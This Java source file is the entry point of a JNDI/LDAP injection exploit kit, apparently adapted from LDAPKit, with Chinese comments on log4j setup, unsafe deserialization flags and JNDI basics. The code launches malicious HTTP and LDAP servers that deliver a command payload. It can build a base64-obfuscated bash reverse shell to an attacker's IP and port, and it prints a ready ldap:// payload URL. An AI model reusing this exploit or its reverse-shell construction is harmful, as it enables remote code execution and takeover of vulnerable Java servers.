package com.yale.test.java.classpath.ldap.server;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import com.beust.jcommander.JCommander;

/**
 * https://github.com/EmYiQing/LDAPKit
 * 这个github上面使用的log4j的版本是1.2.17,我这里使用的log4j版本是:log4j-api-2.13.3.jar
 * 这个github上面使用的collections的版本是3.1,我这里使用的collections版本是:commons-collections-3.2.2.jar,
 * 所以我这里运行的时候要加上系统参数：-Dorg.apache.commons.collections.enableUnsafeSerialization=true，否则就会报错.
 * 所以src下面的log4j.properties没有生效,我的研究log4j2的properties应该怎么配置.
 * 首先，0.0.0.0是不能被ping通的。在服务器中，0.0.0.0并不是一个真实的的IP地址，它表示本机中所有的IPV4地址。监听0.0.0.0的端口，就是监听本机中所有IP的端口。
 * localhost其实是域名，一般windows系统默认将localhost指向127.0.0.1，但是localhost并不等于127.0.0.1，localhost指向的IP地址是可以配置的
 * 命名系统是一组关联的上下文，而上下文是包含零个或多个绑定的对象，每个绑定都有一个原子名(实际上就是给绑定的对象起个名字，方便查找该绑定的对象)， 
 * 使用JNDI的好处就是配置统一的管理接口，下层可以使用RMI、LDAP或者CORBA来访问目标服务
 * @author issuser
 */
public class Main {
	private static final Logger logger = LogManager.getLogger(Main.class);
	public static void main(String[] args) {
		Logo.print();
		logger.error("start jndi kit");
		Command command = new Command();
		JCommander jc = JCommander.newBuilder().addObject(command).build();
		jc.parse(args);
		if (command.help) {
			jc.usage();
			return;
		}
		String cmd;
		if (command.command == null || "".equals(command.command)) {
			cmd = "calc.exe";
		} else {
			cmd = command.command;
		}
		
		if (command.reverse != null && !"".equals(command.reverse)) {
			logger.info("use reverse shell");
			logger.info("ignore command input");
			String ip = command.reverse.split(":")[0];
			String port = command.reverse.split(":")[1];
			
			String reverseTemp = "bash -i > & /dev/tcp/__IP__/__PORT__ 0>&1";
			String reverse = reverseTemp.replace("__IP__", ip);
			reverse = reverse.replace("__PORT__", port);
			reverse = Base64.getEncoder().encodeToString(reverse.getBytes(StandardCharsets.UTF_8));
			String template = "bash -c {echo,__BASE64__}|{base64,-d}|{bash,-i}";
			cmd = template.replace("__BASE64__", reverse);
		}
		
		try {
			logger.error("cmd:" + cmd);
			String finalCmd = cmd;
			new Thread(() -> Http.start(finalCmd)).start();
			new Thread(() -> Ldap.start(command.cc, finalCmd)).start();
			Thread.sleep(1000);
			System.out.println("|--------------------------------------------------------|");
			System.out.println("|-----Payload: ldap://127.0.0.1:1389/badClassName--------|");
			System.out.println("|--------------------------------------------------------|");
			System.out.println("JDK类路径classes: " + System.getProperty("java.class.path"));
			System.out.println("JDK的版本: " + System.getProperty("java.version"));
		} catch(Exception e) {
			logger.error(e.getMessage());
		}
	}
}
